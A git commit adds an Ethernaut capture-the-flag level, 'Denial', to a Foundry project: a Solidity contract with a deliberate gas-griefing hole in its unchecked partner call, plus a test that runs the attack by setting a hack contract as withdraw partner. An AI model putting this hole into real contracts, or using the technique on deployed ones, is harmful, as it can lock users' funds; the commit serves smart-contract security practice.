b5ead8a6c3059937fe7ab8e0ea8bc852147b94c6
InfoSecSheep <plaguecrafter@lavabit.com>
2023-03-05 15:13:07 +0200

    added denial hack

---
+++ src/20-Denial/Denial.sol
@@ -0,0 +1,42 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";
+
+contract Denial {
+    using SafeMath for uint256;
+
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    // Foundry: wrapped address in "payable" to avoid error
+    address payable public constant owner = payable(address(0xA9E));
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance.div(100);
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+
+        // you can make the call function waste all the gas so that the owner.transfer
+        // function doesn't have enough gas to execute, thus passing the level
+        partner.call{value: amountToSend}("");
+        owner.transfer(amountToSend);
+        // keep track of last withdrawal time
+        // Foundry: changed from "now" as it is deprecated
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
---
+++ test/Denial.t.sol
@@ -0,0 +1,50 @@
+pragma solidity ^0.8.10;
+
+import "lib/forge-std/lib/ds-test/src/test.sol";
+import "../src/20-Denial/DenialFactory.sol";
+import "../src/20-Denial/DenialHack.sol";
+import "../src/Ethernaut.sol";
+import "./utils/vm.sol";
+
+contract DenialTest is DSTest {
+    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    Ethernaut ethernaut;
+    address eoaAddress = address(0);
+
+    function setUp() public {
+        // Setup instance of the Ethernaut contracts
+        ethernaut = new Ethernaut();
+        // Deal EOA address some ether
+        vm.deal(eoaAddress, 5 ether);
+    }
+
+    function testDenialHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        DenialFactory denialFactory = new DenialFactory();
+        ethernaut.registerLevel(denialFactory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(denialFactory);
+        Denial ethernautDenial = Denial(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+
+        // Create DenialHack Contract
+        DenialHack denialHack = new DenialHack();
+
+        // set withdraw parter. callback function will waste all pased gas when admin calls "withdraw"
+        ethernautDenial.setWithdrawPartner(address(denialHack));
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
